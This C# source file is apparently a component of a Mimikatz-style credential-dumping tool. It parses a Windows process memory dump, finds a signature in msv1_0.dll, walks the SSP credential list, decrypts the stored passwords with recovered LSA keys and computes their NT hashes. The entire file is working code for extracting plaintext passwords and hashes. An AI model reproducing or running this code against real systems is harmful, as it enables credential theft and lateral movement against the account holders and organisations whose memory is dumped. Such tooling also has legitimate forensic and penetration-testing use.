using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

using MiniDumpModule.Crypto;
using MiniDumpModule.Templates;
using static MiniDumpModule.Helpers;

namespace MiniDumpModule.Decryptor
{
    internal class Ssp_
    {
        public static int FindCredentials(MiniDump minidump, ssp.SspTemplate template)
        {
            ssp.KIWI_SSP_CREDENTIAL_LIST_ENTRY entry;
            string passDecrypted = "";
            long llCurrent;
            long sspCredentialListAddr;

            long position = find_signature(minidump, "msv1_0.dll", template.signature);
            if (position == 0)
                return 0;

            var ptr_entry_loc = (long)get_ptr_with_offset(minidump.BinaryReader, (position + template.first_entry_offset), minidump.SystemInfo);
            sspCredentialListAddr = ReadInt64(minidump.BinaryReader, (long)ptr_entry_loc);

            llCurrent = sspCredentialListAddr;

            do
            {
                llCurrent = Rva2offset(minidump, llCurrent);
                minidump.BinaryReader.BaseStream.Seek(llCurrent, 0);

                byte[] entryBytes = minidump.BinaryReader.ReadBytes(Marshal.SizeOf(typeof(ssp.KIWI_SSP_CREDENTIAL_LIST_ENTRY)));
                entry = ReadStruct<ssp.KIWI_SSP_CREDENTIAL_LIST_ENTRY>(entryBytes);

                string username = ExtractUnicodeStringString(minidump, entry.credentials.UserName);
                string domain = ExtractUnicodeStringString(minidump, entry.credentials.Domain);
                int reference = (int)entry.References;

                minidump.BinaryReader.BaseStream.Seek(Rva2offset(minidump, (long)entry.credentials.Password.Buffer), 0);
                byte[] msvPasswordBytes = minidump.BinaryReader.ReadBytes(entry.credentials.Password.MaximumLength);
                byte[] msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, minidump.LsaKeys);

                passDecrypted = Encoding.Unicode.GetString(msvDecryptedPasswordBytes);

                if (!string.IsNullOrEmpty(username) && username.Length > 1 && msvDecryptedPasswordBytes.Length > 1)
                {
                    var luid = entry.LogonId;

                    Ssp sspentry = new Ssp();
                    //sspentry.Reference = reference;
                    sspentry.UserName = username;

                    if (!string.IsNullOrEmpty(domain))
                    {
                        sspentry.DomainName = domain;
                    }
                    else
                    {
                        sspentry.DomainName = "NULL";
                    }

                    if (!string.IsNullOrEmpty(passDecrypted))
                    {
                        sspentry.Password = passDecrypted;
                    }
                    else
                    {
                        sspentry.Password = "NULL";
                    }

                    try
                    {
                        sspentry.NT = msvDecryptedPasswordBytes.MD4().AsHexString();
                    }
                    catch
                    {
                        sspentry.NT = "NULL";
                    }

                    if (sspentry.Password != "NULL")
                    {
                        Logon currentlogon = minidump.LogonList.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                        if (currentlogon == null)
                        {
                            currentlogon = new Logon(luid);
                            currentlogon.UserName = username;
                            currentlogon.Ssp = new List<Ssp>();
                            currentlogon.Ssp.Add(sspentry);
                            minidump.LogonList.Add(currentlogon);
                        }
                        else
                        {
                            if (currentlogon.Ssp == null)
                                currentlogon.Ssp = new List<Ssp>();

                            currentlogon.Ssp.Add(sspentry);
                        }
                    }
                }

                llCurrent = entry.Flink;
            } while (llCurrent != sspCredentialListAddr);

            return 0;
        }
    }
}